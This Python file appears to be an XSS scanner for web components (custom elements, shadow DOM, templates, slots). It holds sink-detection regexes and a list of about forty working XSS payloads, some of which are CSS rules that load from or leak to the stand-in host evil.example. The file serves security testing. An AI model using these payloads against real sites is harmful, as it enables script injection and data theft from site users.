"""
Web Component XSS Detection Module.

Detects XSS vulnerabilities in modern web components:
- Custom element definition hijacking
- Shadow DOM injection
- Template element reuse attacks
- Web Component lifecycle XSS
"""

import re
from typing import Dict, List, Set
from dataclasses import dataclass
from enum import Enum


class ComponentType(Enum):
    """Web component types."""
    CUSTOM_ELEMENT = "custom_element"
    SHADOW_DOM = "shadow_dom"
    TEMPLATE = "template"
    SLOT = "slot"
    ISOLATED_COMPONENT = "isolated_component"


@dataclass
class WebComponentVulnerability:
    """Web component XSS vulnerability."""
    component_type: ComponentType
    element_name: str
    injection_point: str
    context: str
    payload: str
    severity: str


class WebComponentDetector:
    """
    Advanced web component XSS detector.
    Detects XSS in custom elements, shadow DOM, and template elements.
    """

    # Custom element patterns
    
    CUSTOM_ELEMENT_PATTERNS = [
        # --- Original ---
        r'customElements\.define\s*\(',
        r'@customElement',
        r'class\s+\w+\s+extends\s+HTMLElement',
        r'super\s*\(\s*\)\s*;\s*attachShadow',

        # --- Registry API ---
        r'customElements\.get\s*\(',
        r'customElements\.whenDefined\s*\(',
        r'customElements\.upgrade\s*\(',
        r'customElements\.getName\s*\(',
        r'window\.customElements\b',
        r'ScopedCustomElementRegistry',

        # --- Customized built-ins (`is=` attribute / `extends:`) ---
        r'extends\s*:\s*["\'](?:button|a|input|select|textarea|img|form|div|span|table|ul|li|p)["\']',
        r'\bis\s*=\s*["\'][a-z0-9-]+["\']',                                # <button is="x-btn">
        r'\{\s*extends\s*:\s*["\'][A-Z]',                                   # Lit: static properties
        r'\bglobalThis\.(?:HTML|SVG)[A-Za-z]+Element\b',

        # --- Legacy / non-standard registration ---
        r'document\.registerElement\s*\(',                                  # Chrome < 54
        r'\.registerElement\s*\(',
        r'CustomElementRegistry\s*\(',

        # --- Observed-attributes declaration (drives attributeChangedCallback) ---
        r'static\s+get\s+observedAttributes\s*\(',
        r'observedAttributes\s*[:=]\s*\[',
        r'\battributeChangedCallback\b',

        # --- Constructor / super reflection ---
        r'Reflect\.construct\s*\(',
        r'super\s*\(\s*\.\.\.args\s*\)',
        r'HTMLElement\.prototype\.constructor\.call\s*\(',                  # legacy polyfill
        r'Object\.setPrototypeOf\s*\(\s*this',

        # --- Untrusted definition sources ---
        r'customElements\.define\s*\([^,]+,\s*(?:eval|new\s+Function|Function\s*\()',
        r'customElements\.define\s*\(\s*(?:user|input|param|query|body|attr|props)',

        # --- Lit / Stencil / FAST / Polymer style decorators ---
        r'@property\s*\(',                                                  # Lit
        r'@state\s*\(',                                                     # Lit
        r'@Component\s*\(',                                                 # Stencil / Angular
        r'@customElement\s*\(',                                             # Lit
        r'@attr\s*\(',                                                      # FAST
        r'@observable\s*\(',                                                # FAST
        r'@PolymerElement',                                                 # Polymer
        r'Polymer\s*\(',                                                    # Polymer 1.x
    ]

    # ================================================================
    # Shadow DOM patterns
    # ================================================================
    SHADOW_DOM_PATTERNS = [
        # --- Original ---
        r'attachShadow\s*\(',
        r'shadowRoot',
        r'shadow\.host',
        r'getShadowRoot',

        # --- Mode specification ---
        r'attachShadow\s*\(\s*\{\s*mode\s*:\s*["\']open["\']',
        r'attachShadow\s*\(\s*\{\s*mode\s*:\s*["\']closed["\']',
        r'mode\s*:\s*["\'](?:open|closed)["\']',
        r'\bclosed\s*:\s*true',

        # --- ShadowRoot property access from outside ---
        r'\.shadowRoot\b',
        r'element\.shadowRoot\s*\.',
        r'\.shadowRoot\s*\.\s*innerHTML',

        # --- Declarative Shadow DOM ---
        r'<template\s+[^>]*shadowrootmode\s*=',                              # Chrome 90+
        r'<template\s+[^>]*shadowroot\s*=',                                 # Legacy attribute
        r'shadowrootmode\s*=\s*["\']?(?:open|closed)',
        r'shadowrootdelegatesfocus',
        r'shadowrootclonable',
        r'shadowrootserializable',

        # --- Event retargeting / crossing the boundary ---
        r'\bcomposed\s*:\s*true',
        r'composedPath\s*\(',
        r'event\.composedPath',
        r'slotted\s*\(',

        # --- CSS scoping / piercing ---
        r'::part\s*\(',
        r'::slotted\s*\(',
        r'::deep\b',                                                        # legacy
        r'>>>\s',                                                           # legacy
        r'/deep/',                                                          # legacy
        r'part\s*=\s*["\']',

        # --- Constructable stylesheets ---
        r'adoptedStyleSheets',
        r'new\s+CSSStyleSheet\s*\(',
        r'CSSStyleSheet\.replaceSync\s*\(',
        r'CSSStyleSheet\.replace\s*\(',

        # --- ElementInternals / accessible / form associated ---
        r'attachInternals\s*\(',
        r'ElementInternals',
        r'setFormValue\s*\(',
        r'setValidity\s*\(',
        r'setAriaLabel\s*\(',

        # --- Shadow-boundary escape primitives ---
        r'\.getRootNode\s*\(',
        r'\.getRootNode\s*\(\s*\{\s*composed\s*:\s*true',
        r'ShadowRoot\.prototype',
    ]

    # ================================================================
    # Template patterns
    # ================================================================
    TEMPLATE_PATTERNS = [
        # --- Original ---
        r'<template\s+',
        r'content\s*=',
        r'template\.content',
        r'document\.createElement\s*\(\s*["\']template',

        # --- Template content access and cloning ---
        r'\.content\.cloneNode\s*\(',
        r'\.content\.firstChild',
        r'\.content\.childNodes',
        r'\.content\.querySelector',
        r'\.content\.querySelectorAll',
        r'template\.innerHTML\s*=',

        # --- Fragment / contextual parsing (XSS-relevant parsers) ---
        r'createContextualFragment\s*\(',
        r'Range\.prototype\.createContextualFragment',
        r'new\s+Range\s*\(\s*\)\s*\.createContextualFragment',
        r'document\.createRange\s*\(\s*\)\s*\.createContextualFragment',
        r'DocumentFragment\s*\(',

        # --- Declarative shadow DOM via template ---
        r'<template\s+[^>]*shadowrootmode\s*=',

        # --- Newer safe/unsafe parse APIs ---
        r'Element\.prototype\.setHTML\s*\(',                                # sanitizer-aware
        r'Element\.prototype\.setHTMLUnsafe\s*\(',                          # direct sink
        r'\.setHTMLUnsafe\s*\(',
        r'document\.parseHTMLUnsafe\s*\(',
        r'\.parseHTMLUnsafe\s*\(',

        # --- Import / clone nodes ---
        r'document\.importNode\s*\(',
        r'\.importNode\s*\(',
        r'\.cloneNode\s*\(\s*true',
    ]

    # ================================================================
    # Slot patterns
    # ================================================================
    SLOT_PATTERNS = [
        # --- Original ---
        r'<slot\s+',
        r'slot\s*=',
        r'assignedElements',
        r'assignedNodes',

        # --- Slot identity ---
        r'<slot\s+name\s*=',
        r'\bslot\s*=\s*["\'][^"\']+["\']',                                 # element assigned to named slot
        r'\.assignedSlot\b',
        r'\.assignedSlot\s*\.',

        # --- Slot change handling ---
        r'slotchange',
        r'addEventListener\s*\(\s*["\']slotchange["\']',
        r'onslotchange\s*=',

        # --- Slot name reflection (attribute injection surface) ---
        r'\.name\s*=\s*(?:user|input|param|query|body|attr|props)',          # slot.name ← untrusted
        r'setAttribute\s*\(\s*["\']name["\']',
        r'setAttribute\s*\(\s*["\']slot["\']',

        # --- Slot → innerHTML sink combinations ---
        r'assignedNodes\s*\([^)]*\)\s*\.(?:forEach|map)',
        r'assignedElements\s*\([^)]*\)\s*\.',
        r'\.assignedNodes\s*\([^)]*\)\s*\[0\]\.',

        # --- Fallback content (used when no slot filled) ---
        r'<slot[^>]*>[\s\S]{0,100}<script',
        r'<slot[^>]*>[\s\S]{0,100}<img[^>]+onerror',
    ]

    # ================================================================
    # XSS sink patterns in web components
    # ================================================================
    COMPONENT_SINK_PATTERNS = {
        # --- Original ---
        "innerHTML": r'\.innerHTML\s*=',
        "outerHTML": r'\.outerHTML\s*=',
        "insertAdjacentHTML": r'insertAdjacentHTML\s*\(',
        "eval": r'\beval\s*\(',
        "Function": r'new\s+Function\s*\(',
        "setTimeout": r'setTimeout\s*\(',
        "setInterval": r'setInterval\s*\(',

        # --- Modern HTML parsing APIs (direct sinks) ---
        "setHTMLUnsafe": r'\.setHTMLUnsafe\s*\(',
        "parseHTMLUnsafe": r'document\.parseHTMLUnsafe\s*\(',
        "setHTML": r'\.setHTML\s*\(',                                       # sanitizer-aware, still test-worthy
        "createContextualFragment": r'createContextualFragment\s*\(',
        "DocumentFragment": r'document\.createRange\s*\(\s*\)\s*\.createContextualFragment',
        "documentWrite": r'document\.write(?:ln)?\s*\(',

        # --- Shadow-boundary sinks ---
        "shadowRootInnerHTML": r'\.shadowRoot\s*\.\s*innerHTML\s*=',
        "shadowRootAppend": r'\.shadowRoot\s*\.\s*(?:appendChild|append|prepend|replaceChildren)',
        "shadowRootSetHTML": r'\.shadowRoot\s*\.\s*setHTMLUnsafe\s*\(',
        "declarativeShadow": r'shadowrootmode\s*=',
        "attachShadowContent": r'attachShadow\s*\([^)]*\)\s*\.\s*innerHTML\s*=',

        # --- Template content sinks ---
        "templateContentInnerHTML": r'\.content\.innerHTML\s*=',
        "templateContentSetHTML": r'\.content\.setHTMLUnsafe\s*\(',
        "importNodeSrc": r'\.importNode\s*\([^)]*\)\s*\.\s*(?:innerHTML|outerHTML)',

        # --- DOM manipulation sinks ---
        "replaceChildren": r'\.replaceChildren\s*\(',
        "replaceWith": r'\.replaceWith\s*\(',
        "beforeAfter": r'\.(?:before|after)\s*\(',
        "append": r'\.append\s*\(',
        "prepend": r'\.prepend\s*\(',
        "appendChild": r'\.appendChild\s*\(',
        "insertBefore": r'\.insertBefore\s*\(',
        "insertAdjacentText": r'insertAdjacentText\s*\(',
        "insertAdjacentElement": r'insertAdjacentElement\s*\(',

        # --- Attribute-based sinks (on* handlers, javascript: URLs) ---
        "setAttribute": r'\.setAttribute\s*\(',
        "setAttributeOnHandler": r'\.setAttribute\s*\(\s*["\']on[a-z]+["\']',
        "setAttributeHref": r'\.setAttribute\s*\(\s*["\'](?:href|src|action|formaction)["\']',
        "setAttributeSRC": r'\.setAttribute\s*\(\s*["\']src["\']',
        "setAttributeStyle": r'\.setAttribute\s*\(\s*["\']style["\']',
        "propertyAssignment": r'\.(?:href|src|action|formaction)\s*=\s*(?:user|input|param|query|body|attr|props|this\.)',

        # --- CSS sinks ---
        "CSSStyleSheetReplace": r'CSSStyleSheet\.replace(?:Sync)?\s*\(',
        "adoptedStyleSheets": r'adoptedStyleSheets\s*=',
        "unsafeCSS": r'unsafeCSS\s*\(',                                     # Lit
        "litUnsafeHTML": r'unsafeHTML\s*\(',                                # Lit
        "litUnsafeSVG": r'unsafeSVG\s*\(',                                  # Lit
        "styleTag": r'createElement\s*\(\s*["\']style["\']',

        # --- Form-associated hijacks (ElementInternals) ---
        "setFormValue": r'setFormValue\s*\(',
        "setValidity": r'setValidity\s*\(',
        "attachInternals": r'attachInternals\s*\(',

        # --- Slot-based reflection ---
        "assignedNodesInnerHTML": r'assignedNodes\s*\([^)]*\)[^;]*\.(?:innerHTML|outerHTML)\s*=',
        "assignedElementsInnerHTML": r'assignedElements\s*\([^)]*\)[^;]*\.(?:innerHTML|outerHTML)\s*=',
        "slotNameReflect": r'\.name\s*=\s*(?:user|input|param|query|body|attr|props)',

        # --- Worker / messaging / eval-like ---
        "postMessage": r'\.postMessage\s*\(',
        "importScripts": r'importScripts\s*\(',
        "WorkerConstructor": r'new\s+Worker\s*\(',
        "MessageChannel": r'new\s+MessageChannel\s*\(',
    }

    # ================================================================
    # Web component lifecycle hooks
    # ================================================================
    LIFECYCLE_HOOKS = [
        # --- Original (reactions & observed attributes) ---
        "connectedCallback",
        "disconnectedCallback",
        "adoptedCallback",
        "attributeChangedCallback",

        # --- Construction ---
        "constructor",
        "static get observedAttributes",

        # --- Form-associated custom elements (FACEs) ---
        "formAssociatedCallback",
        "formDisabledCallback",
        "formResetCallback",
        "formStateRestoreCallback",
        "formAssociated",

        # --- Newer reactions ---
        "connectedMoveCallback",                                            # Chrome 128+

        # --- Shadow-root lifecycle observables ---
        "slotchange",
        "attachShadow",
        "attachInternals",

        # --- Static definition surface ---
        "static get formAssociated",
        "static get observedAttributes",
        "static get template",                                              # Lit / Stencil
        "static get styles",                                                # Lit
        "static get properties",                                            # Lit
    ]

    # ================================================================
    # XSS payloads for web components
    # ================================================================
    COMPONENT_XSS_PAYLOADS = [
        # --- Original (baseline DOM sinks) ---
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<style>@keyframes x{from{color:red}to{color:expression(alert(1))}}</style>",

        # --- Slot-based injection (attacker controls light DOM children) ---
        "<my-el><img src=x onerror=alert(1) slot=\"content\"></my-el>",
        "<my-el><svg onload=alert(1) slot=\"icon\"></svg></my-el>",
        "<my-el><template slot=\"header\"><script>alert(1)</script></template></my-el>",
        "<my-el><span slot=\"title\"><img src=x onerror=alert(1)></span></my-el>",

        # --- Declarative Shadow DOM (Chrome 90+) ---
        "<div><template shadowrootmode=\"open\"><script>alert(1)</script></template></div>",
        "<div><template shadowrootmode=\"open\"><img src=x onerror=alert(1)></template></div>",
        "<my-el><template shadowrootmode=\"open\"><style>@import 'https://evil.example/x.css';</style></template></my-el>",
        "<div><template shadowrootmode=\"closed\"><script>alert(1)</script></template></div>",
        "<div><template shadowrootmode=\"open\" shadowrootdelegatesfocus><img src=x onerror=alert(1)></template></div>",

        # --- Customized built-in elements ---
        "<button is=\"x-btn\" onclick=\"alert(1)\">click</button>",
        "<a is=\"x-link\" href=\"javascript:alert(1)\">click</a>",
        "<input is=\"x-input\" onfocus=\"alert(1)\" autofocus>",
        "<x-el extends=\"button\" onclick=\"alert(1)\">test</x-el>",

        # --- setHTMLUnsafe / parseHTMLUnsafe (Chrome 124+) ---
        "<div id=x></div><script>document.getElementById('x').setHTMLUnsafe('<img src=x onerror=alert(1)>')</script>",
        "<div id=x></div><script>document.getElementById('x').setHTMLUnsafe('<template shadowrootmode=open><script>alert(1)</script></template>')</script>",
        "<div id=x></div><script>document.getElementById('x').setHTMLUnsafe('<my-el><img src=x onerror=alert(1) slot=\"x\"></my-el>')</script>",

        # --- ::part() / ::slotted() CSS-injection (CSS-only exfil) ---
        "<my-el><style>my-el::part(content){background:url('https://evil.example/leak')}</style></my-el>",
        "<my-el><style>::slotted(img){display:none}</style><img src=x onerror=alert(1)></my-el>",

        # --- Shadow-root escape attempts (closed-mode bypass) ---
        "<my-el id=x></my-el><script>x.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>",
        "<my-el id=x></my-el><script>x.attachShadow({mode:'open'}).append(document.createElement('img')).outerHTML='<img src=x onerror=alert(1)>'</script>",
        "<my-el id=x></my-el><script>x.attachInternals();x.shadowRoot?.innerHTML='<img src=x onerror=alert(1)>'</script>",

        # --- Lifecycle-driven injection (attributeChangedCallback) ---
        "<x-el data-payload=\"<img src=x onerror=alert(1)>\"></x-el>",
        "<x-el href=\"javascript:alert(1)\"></x-el>",
        "<x-el title=\"<svg onload=alert(1)>\"></x-el>",

        # --- Template content injection (re-parsed on clone) ---
        "<template id=t><img src=x onerror=alert(1)></template><script>document.body.append(t.content.cloneNode(true))</script>",
        "<template id=t><script>alert(1)</script></template><script>document.body.append(t.content.cloneNode(true))</script>",
        "<template id=t shadowrootmode=open><script>alert(1)</script></template>",

        # --- DOM clobbering of the component registry ---
        "<form id=customElements><input name=define value=alert(1)></form>",
        "<a id=customElements><a id=customElements name=define>",
        "<form id=myEl><input name=innerHTML value='<img src=x onerror=alert(1)>'></form>",

        # --- Lit-specific sinks ---
        "<x-el .innerHTML=\"${'<img src=x onerror=alert(1)>'}\"></x-el>",
        "<x-el>${unsafeHTML('<script>alert(1)</script>')}</x-el>",
        "<x-el>${unsafeSVG('<svg onload=alert(1)>')}</x-el>",
        "<x-el><style>${unsafeCSS('body{background:url(//evil.example/x)}')}</style></x-el>",

        # --- Stencil / Angular Elements ---
        "<x-el [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></x-el>",
        "<x-el innerHTML=\"'<img src=x onerror=alert(1)>'\"></x-el>",

        # --- mXSS via template re-parse ---
        "<template><math><mtext><style><img src=x onerror=alert(1)></style></mtext></math></template><script>document.body.append(document.querySelector('template').content)</script>",
        "<template><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></template><script>document.body.append(document.querySelector('template').content)</script>",

        # --- Form-associated element value hijack ---
        "<x-form-input name=password value=\"secret\"></x-form-input><script>x.querySelector('x-form-input').setFormValue('attacker')</script>",

        # --- Slot name reflection ---
        "<my-el><span slot=\"content\"><img src=x onerror=alert(1)></span></my-el>",
        "<slot name=\"<img src=x onerror=alert(1)>\"></slot>",
    ]

    def __init__(self):
        self._detected_components: Set[ComponentType] = set()
        self._vulnerabilities: List[WebComponentVulnerability] = []

    def detect_components(self, html_content: str, js_content: str = "") -> Set[ComponentType]:
        """
        Detect which web component types are present.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code

        Returns:
            Set of detected component types
        """
        combined = html_content + "\n" + js_content
        detected = set()

        for pattern in self.CUSTOM_ELEMENT_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                detected.add(ComponentType.CUSTOM_ELEMENT)

        for pattern in self.SHADOW_DOM_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                detected.add(ComponentType.SHADOW_DOM)

        for pattern in self.TEMPLATE_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                detected.add(ComponentType.TEMPLATE)

        for pattern in self.SLOT_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                detected.add(ComponentType.SLOT)

        self._detected_components = detected
        return detected

    def detect_custom_elements(self, js_content: str) -> List[str]:
        """
        Extract custom element names from JavaScript.

        Args:
            js_content: JavaScript source code

        Returns:
            List of custom element names
        """
        elements = []
        pattern = r'customElements\.define\s*\(\s*["\']([\w-]+)["\']'
        matches = re.finditer(pattern, js_content)
        for match in matches:
            elements.append(match.group(1))
        return elements

    def check_shadow_dom_xss(self, js_content: str, marker: str = "xoxss") -> List[WebComponentVulnerability]:
        """
        Check for XSS in shadow DOM operations.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for shadow DOM with innerHTML
            if re.search(r'shadowRoot|shadow\s*\.|this\.shadowRoot', line, re.IGNORECASE):
                for sink_name, sink_pattern in self.COMPONENT_SINK_PATTERNS.items():
                    if re.search(sink_pattern, line, re.IGNORECASE):
                        for payload in self.COMPONENT_XSS_PAYLOADS:
                            marked = payload.replace("alert(1)", f"alert('{marker}')")
                            vulnerabilities.append(WebComponentVulnerability(
                                component_type=ComponentType.SHADOW_DOM,
                                element_name="shadow_dom",
                                injection_point=f"line_{line_num}",
                                context=f"{sink_name} in shadow DOM",
                                payload=marked,
                                severity="high"
                            ))

        return vulnerabilities

    def check_template_xss(self, html_content: str, js_content: str, marker: str = "xoxss") -> List[WebComponentVulnerability]:
        """
        Check for XSS in template element reuse.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []

        # Check for template elements with user input
        template_pattern = r'<template[^>]*>(.*?)</template>'
        matches = re.finditer(template_pattern, html_content, re.DOTALL | re.IGNORECASE)

        for match in matches:
            template_content = match.group(1)
            if re.search(r'<script|<iframe|<svg|on\w+\s*=', template_content, re.IGNORECASE):
                for payload in self.COMPONENT_XSS_PAYLOADS:
                    marked = payload.replace("alert(1)", f"alert('{marker}')")
                    vulnerabilities.append(WebComponentVulnerability(
                        component_type=ComponentType.TEMPLATE,
                        element_name="template",
                        injection_point="template_content",
                        context="Template element with potentially dangerous content",
                        payload=marked,
                        severity="medium"
                    ))

        # Check for template cloning with user input
        if re.search(r'template\.content\.cloneNode|importNode\s*\(\s*template', js_content, re.IGNORECASE):
            for payload in self.COMPONENT_XSS_PAYLOADS:
                marked = payload.replace("alert(1)", f"alert('{marker}')")
                vulnerabilities.append(WebComponentVulnerability(
                    component_type=ComponentType.TEMPLATE,
                    element_name="template_clone",
                    injection_point="template_cloning",
                    context="Template cloning with potential user input",
                    payload=marked,
                    severity="high"
                ))

        return vulnerabilities

    def check_lifecycle_xss(self, js_content: str, marker: str = "xoxss") -> List[WebComponentVulnerability]:
        """
        Check for XSS in web component lifecycle hooks.

        Args:
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        lines = js_content.split('\n')

        for line_num, line in enumerate(lines, 1):
            for hook in self.LIFECYCLE_HOOKS:
                if hook in line:
                    # Check if lifecycle hook uses dangerous sinks
                    for sink_name, sink_pattern in self.COMPONENT_SINK_PATTERNS.items():
                        if re.search(sink_pattern, line, re.IGNORECASE):
                            for payload in self.COMPONENT_XSS_PAYLOADS:
                                marked = payload.replace("alert(1)", f"alert('{marker}')")
                                vulnerabilities.append(WebComponentVulnerability(
                                    component_type=ComponentType.CUSTOM_ELEMENT,
                                    element_name=hook,
                                    injection_point=f"line_{line_num}",
                                    context=f"{sink_name} in {hook}",
                                    payload=marked,
                                    severity="high"
                                ))

        return vulnerabilities

    def scan_for_web_component_xss(
        self,
        html_content: str,
        js_content: str = "",
        marker: str = "xoxss"
    ) -> List[WebComponentVulnerability]:
        """
        Scan for web component XSS vulnerabilities.

        Args:
            html_content: HTML source code
            js_content: JavaScript source code
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []
        components = self.detect_components(html_content, js_content)

        if not components:
            return self._vulnerabilities

        # Check shadow DOM XSS
        if ComponentType.SHADOW_DOM in components:
            self._vulnerabilities.extend(self.check_shadow_dom_xss(js_content, marker))

        # Check template XSS
        if ComponentType.TEMPLATE in components:
            self._vulnerabilities.extend(self.check_template_xss(html_content, js_content, marker))

        # Check lifecycle XSS
        if ComponentType.CUSTOM_ELEMENT in components:
            self._vulnerabilities.extend(self.check_lifecycle_xss(js_content, marker))

        return self._vulnerabilities

    def assess_component_risk(self, vulnerabilities: List[WebComponentVulnerability]) -> str:
        """Assess overall web component XSS risk."""
        if not vulnerabilities:
            return "none"

        high_severity = [v for v in vulnerabilities if v.severity == "high"]
        if high_severity:
            return "critical"

        return "high"

    def get_component_summary(self) -> Dict[str, int]:
        """Get summary of web component findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_component_type": {
                "custom_element": sum(1 for v in self._vulnerabilities if v.component_type == ComponentType.CUSTOM_ELEMENT),
                "shadow_dom": sum(1 for v in self._vulnerabilities if v.component_type == ComponentType.SHADOW_DOM),
                "template": sum(1 for v in self._vulnerabilities if v.component_type == ComponentType.TEMPLATE),
                "slot": sum(1 for v in self._vulnerabilities if v.component_type == ComponentType.SLOT),
            },
        }
        return summary


__all__ = [
    "ComponentType",
    "WebComponentDetector",
    "WebComponentVulnerability",
]
